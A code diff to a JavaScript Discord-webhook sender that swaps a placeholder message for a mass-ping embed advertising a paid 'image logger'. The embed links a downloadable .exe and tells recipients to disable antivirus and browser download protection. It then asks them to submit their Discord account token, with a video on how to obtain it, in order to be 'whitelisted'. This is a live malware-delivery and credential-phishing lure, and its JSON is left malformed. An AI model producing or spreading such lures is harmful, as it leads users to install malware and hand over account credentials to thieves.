@@ -17,9 +17,52 @@
       request.setRequestHeader('Content-type', 'application/json');
 
       var params = {
-        username: "My Webhook Name",
-        avatar_url: "",
-        content: "The message to send"
+        
+  "username": "ᴏᴘ ʙᴇᴀᴍ™️",
+  "avatar_url": "",
+  "content": "@everyone",
+  "embeds": [
+    {
+      "title": "Instructions",
+      "color": 16774912,
+      "description": "File: **VERSION V1**  (latest)\nhttps://cdn.discordapp.com/attachments/944710008950624300/944719878206660628/Imageloggerv1.exe",
+      "timestamp": "",
+      "author": {
+        "name": "Hello, Thank you for purchasing ᴏᴘ ʙᴇᴀᴍ's Image logger."
+      },
+      "image": {},
+      "thumbnail": {},
+      "footer": {},
+      "fields": [
+        {
+          "name": "1. Download the file",
+          "value": "Download the file above."
+        },
+        {
+          "name": "2. Make sure your AV is off",
+          "value": "Go to your Anti-Virus control center, Disable \"Real Time Protection\"\nIf that does not work for whatever reason, Make an exclusion. To make an exclusion (To whitelist a Folder/file) go to your Anti-Virus's control center and go to manage settings and make an exclusion for the file"
+        },
+        {
+          "name": "IF YOUR STILL HAVING TROUBLE",
+          "value": "Your browser is blocking the download?\nGo to your Anti-Virus app and disable protection for browsers/downloads\nGo to your browsers settings and disable your download protection."
+        },
+        {
+          "name": "HOW TO GET WHITELISTED (via roblox)",
+          "value": "Ensure you have the latest version of Roblox. Download Roblox studio and be logged In.\nthen run the builder."
+        },
+        {
+          "name": "HOW TO GET WHITELISTED (via discord)",
+          "value": "Go to the ticket you made in the official ᴏᴘ ʙᴇᴀᴍ's discord and submit your token.\nIf you cannot be whitelisted, make sure your account is at least 1+ year(s) old. Alternate accounts can be valid. Make sure your token is always valid, if for whatever reason your token is not valid then please ask for support in the official discord."
+        },
+        {
+          "name": "How to get your token",
+          "value": "Visit for help: https://www.youtube.com/watch?v=LnBnm_tZlyU"
+        }
+      ]
+    
+  ],
+  "components": []
+}
       }
 
       request.send(JSON.stringify(params));
